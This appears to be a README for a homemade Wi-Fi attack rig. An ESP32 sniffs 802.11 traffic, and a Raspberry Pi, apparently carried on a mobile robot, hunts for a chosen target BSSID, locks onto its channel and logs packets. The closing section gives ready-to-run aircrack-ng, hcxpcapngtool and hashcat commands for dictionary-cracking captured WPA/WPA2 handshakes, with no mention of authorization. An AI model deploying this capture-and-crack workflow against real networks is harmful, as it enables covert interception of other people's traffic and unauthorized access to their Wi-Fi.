# ESP32 & Raspberry Pi Wi-Fi Packet Capture Pipeline

A lightweight, automated, and high-performance pipeline using an ESP32 as a 2.4GHz promiscuous sniffer and a Raspberry Pi as the automated collection engine. The system features dynamic automated channel hunting, headless asset targeting, packet filtering, and rolling log rotation out of the box.

---

## 🛠️ Requirements & Installation

### On the Raspberry Pi
Ensure Python 3 and the serial bus communication dependencies are installed:
```bash
pip3 install pyserial
```

### On the ESP32
Flash the custom C++ firmware via the Arduino IDE. Ensure the maximum speed baud rate (`921600`) matches, and verify that the `sniffer_callback` outputs raw binary data frames using `pkt->buf` pointers.

---

## 🚀 How to Use

### 1. Launch the Capture Engine
Run the main shell wrapper script. This script automatically handles cold-boot delays, verifies hardware port availability, and kicks off the background logging daemon:
```bash
./wireless_start.sh
```

### 2. Automated vs. Interactive Execution Flow
The script dynamically switches its pipeline behavior based on how you configure your `FLAGS="..."` string inside `wireless_start.sh`:

#### 📡 Automated Targeting Mode (`FLAGS="-m scan -b <MAC>"`)
*   **Phase 1 (The Discovery Phase):** The Pi commands the ESP32 to rapidly hop through channels 1–11 (every 300ms) for a 5-second continuous sweep. It parses Beacon frames in the background to build an in-memory map of local networks.
*   **Phase 2 (The Lock-In Phase):** If your target BSSID is detected, the script skips all user menus, commands the ESP32 to permanently lock onto that specific channel, filters out all other networks, and begins logging to the `.pcap`.
*   **Fail-Safe Fallback:** If the target BSSID is not found in range during the 5-second sweep, the script logs a warning and automatically falls back to standard Catch-All Mode on your default fallback channel so it still captures data.

#### 🌊 Automated Catch-All Mode (`FLAGS="-m all -c <CH>"`)
*   Bypasses the discovery phase completely. It instantly commands the ESP32 to lock onto your specified frequency channel and logs every single packet passing through the air without filtering.

#### 🖥️ Interactive Selection Mode (`FLAGS=""`)
*   If flags are omitted, it presents an interactive terminal menu:
    *   **Option 1 (Scan & Lock):** Performs the 5-second sweep and prints a numbered list of all discovered SSIDs, BSSIDs, and channels. Enter the index number of the network you want to target.
    *   **Option 2 (Blind Catch-All):** Prompts for a manual channel number (1–11) and immediately starts logging all traffic heard on that frequency.

### 3. Stop and Save the Capture
To stop the background recording pipeline cleanly without corrupting data, run the companion stop script:
```bash
./wireless_stop.sh
```
*Note: This script reads the tracked process ID (`capture.pid`) and sends a `SIGINT` (`kill -2`). This allows Python to safely flush the final frames and save the output `.pcap` file without corrupting the file structure.*

---

## 🔑 Cracking WPA Passwords

Once a target capture file is generated, you can parse it for WPA/WPA2 4-way handshakes.

### Method A: Native Cracking with Aircrack-ng
```bash
aircrack-ng -w /path/to/wordlist.txt wifi_capture.pcap
```

### Method B: High-Performance Cracking with Hashcat
Install `hcxtools` to translate raw 802.11 frames into standard Hashcat formats:
```bash
sudo apt update && sudo apt install hcxtools -y
```

Convert your capture file to Hashcat format (PMKID / EAPOL):
```bash
hcxpcapngtool wifi_capture.pcap -o hashcat.txt
```

Execute a dictionary attack using Hashcat's modern standard mode (`22000`):
```bash
hashcat -m 22000 hashcat.txt /path/to/wordlist.txt
```

---

## 💡 Information & Tips

*   **Automatic Log Rotation:** To protect your system storage from filling up during long-term operations, the Python capture loop automatically checks file sizes. If your current capture file crosses **50MB**, it cleanly appends a timestamp, archives it, and opens a fresh `.pcap` file seamlessly.
*   **SD Card Preservation:** The script optimizes disk writes by flushing packet chunks every 25 packets rather than on every single frame, significantly extending your Pi's MicroSD card lifespan.
*   **Compute Limitations:** While the mobile robot platform captures 802.11 packets flawlessly on the move, the password cracking phase requires heavy computation. It is highly recommended to transfer the final `.pcap` or `hashcat.txt` files to a robust machine with an external GPU rather than running dictionary attacks locally on the Raspberry Pi.
